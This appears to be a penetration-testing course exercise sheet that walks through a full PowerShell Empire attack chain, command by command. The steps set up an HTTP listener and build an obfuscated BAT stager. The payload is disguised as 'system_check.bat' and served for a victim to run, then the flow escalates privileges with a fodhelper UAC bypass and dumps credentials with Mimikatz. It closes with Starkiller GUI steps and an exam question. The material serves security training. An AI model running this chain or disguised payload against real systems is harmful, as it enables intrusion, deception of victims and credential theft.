# PowerShell Empire Exercise 5 -- Command Flow

## 1. Go to Empire Directory

``` bash
cd Empire
```

## 2. Start Empire Server

``` bash
powershell-empire server
```

## 3. Open New Terminal & Start Client

``` bash
cd Empire
powershell-empire client
```

## 4. View Commands

``` bash
help
```

## 5. Create HTTP Listener

``` bash
uselistener http

set Name http_listener
set Port 4444
execute
```

### Verify Listener

``` bash
listeners
```

## 6. Create BAT Stager

``` bash
usestager windows_launcher_bat

set Listener http_listener
set Obfuscate True
execute
```

## 7. Copy Generated Payload

``` bash
mkdir payload
cd payload

cp /path/to/generated/launcher.bat /home/pentester/payload/system_check.bat
```

## 8. Share Payload

``` bash
python3 -m http.server 8000
```

## 9. After Victim Executes Payload

``` bash
agents
```

## 10. Interact with Agent

``` bash
interact <Agent_Name>
```

Example:

``` bash
interact DSVX8LCW
```

## 11. Basic Enumeration

``` bash
whoami

info

usemodule powershell_situational_awareness_host_winenum
execute

ps
```

## 12. Privilege Escalation

``` bash
usemodule powershell_privesc_bypassuac_fodhelper

set Listener http_listener
execute
```

## 13. Check New Elevated Agent

``` bash
agents

interact <New_Agent_Name>

info
```

## 14. Dump Credentials

``` bash
mimikatz
```

------------------------------------------------------------------------

# Starkiller (GUI) Flow

1.  Open:

```{=html}
<!-- -->
```
    http://localhost:1337/index.html#/

2.  Login:

-   Username: `empireadmin`
-   Password: `password123`

3.  Navigate:

-   Agents
-   Select Agent
-   Tasks
-   File Browser
-   Execute Module
-   Search: `winpeas`
-   Select: `powershell_privesec_winpeas`
-   Submit
-   View output in Empire Client terminal

------------------------------------------------------------------------

# Quick Revision Flow

    Server
    ↓
    Client
    ↓
    Listener
    ↓
    Stager
    ↓
    Payload
    ↓
    HTTP Server
    ↓
    Victim Executes Payload
    ↓
    Agents
    ↓
    Interact
    ↓
    Enumeration
    ↓
    Privilege Escalation
    ↓
    High-Integrity Agent
    ↓
    Mimikatz
    ↓
    Starkiller GUI

## Exam Question 8.5.1

**Command to list active agents:**

``` bash
agents
```
